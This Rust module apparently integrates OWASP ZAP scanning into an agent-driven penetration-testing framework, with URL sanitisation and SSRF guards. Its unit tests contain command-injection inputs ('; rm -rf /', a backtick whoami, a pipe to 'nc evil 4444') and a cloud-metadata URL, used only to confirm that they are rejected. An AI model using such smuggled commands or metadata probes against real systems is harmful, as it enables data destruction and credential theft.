//! OWASP ZAP - Dynamic Application Security Testing (DAST)
//!
//! Drives OWASP ZAP in one-shot automation mode using the packaged scan
//! scripts (`zap-baseline.py` for passive, `zap-full-scan.py` for active).
//! Each script boots ZAP headless, scans a single target URL, writes a JSON
//! report, and exits — which fits Pick's one-shot runner model far better than
//! managing a long-running ZAP daemon.
//!
//! This is the FOSS, fully-headless web-scan engine. Burp Suite is intentionally
//! NOT automated here (Community has no REST API; Pro is license-gated), so ZAP
//! is the agent-driven DAST integration.

use async_trait::async_trait;
use pentest_core::error::Result;
use pentest_core::provenance::Provenance;
use pentest_core::tools::{
    execute_timed_with_provenance, ExternalDependency, ParamType, PentestTool, Platform,
    ToolCategory, ToolContext, ToolParam, ToolResult, ToolSchema,
};
use pentest_core::url_validation::{target_validation_mode, validate_url, ValidationMode};
use pentest_platform::{get_platform, CommandExec};
use serde_json::{json, Value};
use std::time::Duration;

use super::runner::{param_str_or, read_sandbox_file};
use crate::provenance_support::format_full_command;
use crate::util::param_u64;

/// Candidate names for the ZAP automation scripts across packagings.
const BASELINE_SCRIPTS: &[&str] = &["zap-baseline.py", "zap-baseline"];
const FULLSCAN_SCRIPTS: &[&str] = &["zap-full-scan.py", "zap-full-scan"];

pub struct ZapTool;

#[async_trait]
impl PentestTool for ZapTool {
    fn name(&self) -> &str {
        "zap"
    }

    fn description(&self) -> &str {
        "OWASP ZAP dynamic application security testing (DAST). Headless web app scanner. \
         scan_type='baseline' runs a fast passive scan (safe, spiders + passive rules); \
         scan_type='full' adds active attack rules (intrusive — only with authorization). \
         Returns parsed alerts (findings) with risk levels."
    }

    fn schema(&self) -> ToolSchema {
        ToolSchema::new(self.name(), self.description())
            .external_dependency(
                ExternalDependency::new(
                    "zaproxy",
                    "zaproxy",
                    "OWASP ZAP - dynamic application security testing engine",
                )
                .custom_installer("zap")
                .category(ToolCategory::Proxy),
            )
            .param(ToolParam::required(
                "target",
                ParamType::String,
                "Target URL to scan (e.g. 'https://app.example.com'). Must be a full http(s) URL.",
            ))
            .param(ToolParam::optional(
                "scan_type",
                ParamType::String,
                "'baseline' (passive, safe, default) or 'full' (active attack rules, intrusive)",
                json!("baseline"),
            ))
            .param(ToolParam::required(
                "timeout",
                ParamType::Integer,
                "Timeout in seconds. MUST be set explicitly. Use 300 for baseline, 1200+ for full scans.",
            ))
            .platforms(vec![Platform::Desktop, Platform::Tui])
    }

    fn supported_platforms(&self) -> Vec<Platform> {
        vec![Platform::Desktop, Platform::Tui]
    }

    async fn execute(&self, params: Value, _ctx: &ToolContext) -> Result<ToolResult> {
        execute_timed_with_provenance(|| async move {
            let platform = get_platform();

            let target = param_str_or(&params, "target", "");
            let target = validate_target(&target, target_validation_mode())?;
            let scan_type = param_str_or(&params, "scan_type", "baseline");
            let timeout_secs = param_u64(&params, "timeout", 300);

            // Pick the automation script for the requested scan type, resolving
            // the first variant that exists on PATH.
            let candidates = match scan_type.as_str() {
                "baseline" => BASELINE_SCRIPTS,
                "full" => FULLSCAN_SCRIPTS,
                other => {
                    return Err(pentest_core::error::Error::InvalidParams(format!(
                        "Invalid scan_type '{other}': expected 'baseline' or 'full'"
                    )))
                }
            };
            let script = resolve_script(&platform, candidates).await.ok_or_else(|| {
                pentest_core::error::Error::ToolExecution(format!(
                    "No ZAP automation script found (looked for {candidates:?}). Install OWASP ZAP."
                ))
            })?;

            // JSON report path inside the working environment.
            let report_path = "/tmp/zap-report.json";

            // -t target, -J json-report, -I "do not fail on warnings" so a clean
            // exit code doesn't mask findings; -m N minutes for spider.
            let args = vec![
                "-t".to_string(),
                target.clone(),
                "-J".to_string(),
                report_path.to_string(),
                "-I".to_string(),
            ];
            let args_refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();

            let result = platform
                .execute_command(&script, &args_refs, Duration::from_secs(timeout_secs))
                .await?;

            // ZAP automation scripts exit non-zero when alerts are found; that is
            // success for us. Only treat a missing report as a hard failure.
            let report_json = read_sandbox_file(&platform, report_path).await.ok();

            let data = match report_json {
                Some(raw) => parse_zap_report(&raw, &result.stderr)?,
                None => {
                    return Err(pentest_core::error::Error::ToolExecution(format!(
                        "ZAP produced no report. stderr: {}",
                        result.stderr
                    )))
                }
            };

            let full_command = format_full_command(&script, &args);
            let provenance = Provenance::new(
                "zap",
                "owasp-zap",
                pentest_core::provenance::ProbeCommand::from_exact(full_command)
                    .with_description(format!("OWASP ZAP {scan_type} scan")),
                pentest_core::provenance::truncate_excerpt(
                    &serde_json::to_string(&data).unwrap_or_default(),
                ),
            );

            Ok((data, provenance))
        })
        .await
    }
}

/// Two-layer target validation for the zap tool (#311).
///
/// 1. [`sanitize_target_url`] — a local scheme + shell-metacharacter pre-check.
/// 2. The SHARED SSRF guard [`pentest_core::url_validation::validate_url`],
///    which classifies the resolved IP and blocks link-local / cloud-metadata /
///    private ranges per `mode`.
///
/// zap was previously the only *fetching* web tool that skipped layer 2, so it
/// would scan `169.254.169.254` regardless of `PENTEST_ALLOW_PRIVATE_IPS`; the
/// sibling web tools (nikto/ffuf/dirb/gobuster) all gate this way. Extracted as
/// a pure, mode-parameterized helper so the wiring itself is unit-testable
/// (the production `execute` path only ever gets `Development` in debug builds,
/// which would mask the guard).
fn validate_target(raw: &str, mode: ValidationMode) -> Result<String> {
    let pre = sanitize_target_url(raw)?;
    validate_url(&pre, mode, None)
}

/// Defense-in-depth pre-check: the target must be a well-formed http(s) URL and
/// contain no shell metacharacters. Returns the trimmed URL string.
///
/// This does NOT perform SSRF/IP classification — that is layer 2 in
/// [`validate_target`]. Kept as a separate layer so a bad scheme or an injected
/// metacharacter is rejected with a specific message before DNS resolution, and
/// so the metachar guard survives even if the shared call is ever refactored.
fn sanitize_target_url(raw: &str) -> Result<String> {
    let url = raw.trim();
    if url.is_empty() {
        return Err(pentest_core::error::Error::InvalidParams(
            "target URL is required".into(),
        ));
    }
    if !(url.starts_with("http://") || url.starts_with("https://")) {
        return Err(pentest_core::error::Error::InvalidParams(format!(
            "target must be a full http(s) URL, got '{url}'"
        )));
    }
    // Reject shell metacharacters defensively even though args are passed as an
    // argv vector (never a shell string).
    if url.chars().any(|c| {
        matches!(
            c,
            ';' | '&' | '|' | '`' | '$' | '<' | '>' | '\n' | '\r' | '\\' | '"' | '\''
        )
    }) {
        return Err(pentest_core::error::Error::InvalidParams(
            "target URL contains invalid characters".into(),
        ));
    }
    Ok(url.to_string())
}

/// Find the first script variant present on PATH.
async fn resolve_script<P: CommandExec>(platform: &P, candidates: &[&str]) -> Option<String> {
    for name in candidates {
        if platform
            .execute_command("which", &[name], Duration::from_secs(5))
            .await
            .map(|r| r.exit_code == 0)
            .unwrap_or(false)
        {
            return Some(name.to_string());
        }
    }
    None
}

/// Parse a ZAP JSON report into a normalized findings structure.
///
/// The report shape is `{ "site": [ { "alerts": [ { ... } ] } ] }`. We flatten
/// alerts across sites into a single list with the fields the report agent needs.
fn parse_zap_report(raw: &str, stderr: &str) -> Result<Value> {
    // Guard against a hostile target inflating the report (millions of alerts)
    // to exhaust memory when we parse it. 32 MiB is far above any legitimate
    // report.
    const MAX_REPORT_BYTES: usize = 32 * 1024 * 1024;
    if raw.len() > MAX_REPORT_BYTES {
        return Err(pentest_core::error::Error::ToolExecution(format!(
            "ZAP report too large ({} bytes, limit {MAX_REPORT_BYTES})",
            raw.len()
        )));
    }

    let parsed: Value = serde_json::from_str(raw).map_err(|e| {
        pentest_core::error::Error::ToolExecution(format!("Failed to parse ZAP report: {e}"))
    })?;

    let mut alerts = Vec::new();
    if let Some(sites) = parsed.get("site").and_then(|s| s.as_array()) {
        for site in sites {
            let site_name = site
                .get("@name")
                .and_then(|v| v.as_str())
                .unwrap_or_default()
                .to_string();
            if let Some(site_alerts) = site.get("alerts").and_then(|a| a.as_array()) {
                for alert in site_alerts {
                    alerts.push(json!({
                        "site": site_name,
                        "name": alert.get("name").and_then(|v| v.as_str()).unwrap_or_default(),
                        "risk": alert.get("riskdesc").and_then(|v| v.as_str()).unwrap_or_default(),
                        "confidence": alert.get("confidence").and_then(|v| v.as_str()).unwrap_or_default(),
                        "description": alert.get("desc").and_then(|v| v.as_str()).unwrap_or_default(),
                        "solution": alert.get("solution").and_then(|v| v.as_str()).unwrap_or_default(),
                        "cweid": alert.get("cweid").and_then(|v| v.as_str()).unwrap_or_default(),
                        "instances": alert.get("instances").and_then(|v| v.as_array()).map(|a| a.len()).unwrap_or(0),
                    }));
                }
            }
        }
    }

    Ok(json!({
        "alerts": alerts,
        "count": alerts.len(),
        "summary": format!("ZAP scan found {} alert(s)", alerts.len()),
        "stderr": stderr,
    }))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sanitize_target_url_accepts_http_and_https() {
        assert_eq!(
            sanitize_target_url("https://app.example.com").unwrap(),
            "https://app.example.com"
        );
        // The pre-check only normalizes shape; it does NOT judge the IP. The
        // shared guard (run by the caller) is what blocks private/metadata
        // ranges — see zap_blocks_metadata_via_shared_guard below.
        assert_eq!(
            sanitize_target_url(" http://10.0.0.5:8080/ ").unwrap(),
            "http://10.0.0.5:8080/"
        );
    }

    #[test]
    fn sanitize_target_url_rejects_non_http() {
        assert!(sanitize_target_url("app.example.com").is_err());
        assert!(sanitize_target_url("ftp://x").is_err());
        assert!(sanitize_target_url("").is_err());
    }

    #[test]
    fn sanitize_target_url_rejects_shell_metacharacters() {
        assert!(sanitize_target_url("https://x.com; rm -rf /").is_err());
        assert!(sanitize_target_url("https://x.com`whoami`").is_err());
        assert!(sanitize_target_url("https://x.com|nc evil 4444").is_err());
    }

    // #311: zap must run the SHARED SSRF guard, not just its local metachar
    // pre-check. These exercise `validate_target` (the composed wiring the tool
    // actually calls), NOT the shared guard directly — so a revert of layer 2
    // inside `validate_target` turns them red. Guard-verified by mutation:
    // neutering the `validate_url` call in `validate_target` fails these.

    #[test]
    fn zap_blocks_metadata_via_shared_guard() {
        // The cloud-metadata service passes the local pre-check (well-formed
        // http, no metachars) but `validate_target` must refuse it in both the
        // default Production mode and the relaxed PrivateNetwork mode, because
        // the shared guard classifies 169.254.169.254 as link-local.
        let metadata = "http://169.254.169.254/latest/meta-data/";
        assert!(
            sanitize_target_url(metadata).is_ok(),
            "pre-check alone must NOT be what blocks it"
        );
        assert!(
            validate_target(metadata, ValidationMode::Production).is_err(),
            "metadata must be blocked in Production"
        );
        assert!(
            validate_target(metadata, ValidationMode::PrivateNetwork).is_err(),
            "metadata must be blocked in PrivateNetwork too"
        );
    }

    #[test]
    fn zap_blocks_private_ip_in_production() {
        // Behavior change (#311): before this fix the tool accepted any RFC-1918
        // target unconditionally. Now `validate_target` blocks it in Production
        // (release default); an operator must set PENTEST_ALLOW_PRIVATE_IPS=true
        // to scan private targets, matching nikto/ffuf/dirb/gobuster.
        let private = "http://10.0.0.5:8080/";
        assert!(sanitize_target_url(private).is_ok());
        assert!(
            validate_target(private, ValidationMode::Production).is_err(),
            "RFC-1918 must be blocked in Production"
        );
        assert!(
            validate_target(private, ValidationMode::PrivateNetwork).is_ok(),
            "RFC-1918 must be allowed once the private-IP opt-in is on"
        );
    }

    #[test]
    fn parse_report_flattens_alerts_across_sites() {
        let raw = json!({
            "site": [{
                "@name": "https://app.example.com",
                "alerts": [
                    {"name": "XSS", "riskdesc": "High", "confidence": "Medium",
                     "desc": "reflected", "solution": "encode", "cweid": "79",
                     "instances": [{"uri": "/a"}, {"uri": "/b"}]},
                    {"name": "Missing Header", "riskdesc": "Low"}
                ]
            }]
        })
        .to_string();
        let parsed = parse_zap_report(&raw, "").unwrap();
        assert_eq!(parsed["count"], 2);
        assert_eq!(parsed["alerts"][0]["name"], "XSS");
        assert_eq!(parsed["alerts"][0]["risk"], "High");
        assert_eq!(parsed["alerts"][0]["instances"], 2);
        assert_eq!(parsed["alerts"][1]["risk"], "Low");
    }

    #[test]
    fn parse_report_handles_no_alerts() {
        let raw = json!({"site": [{"@name": "x", "alerts": []}]}).to_string();
        let parsed = parse_zap_report(&raw, "").unwrap();
        assert_eq!(parsed["count"], 0);
    }

    #[test]
    fn parse_report_rejects_invalid_json() {
        assert!(parse_zap_report("not json", "").is_err());
    }
}
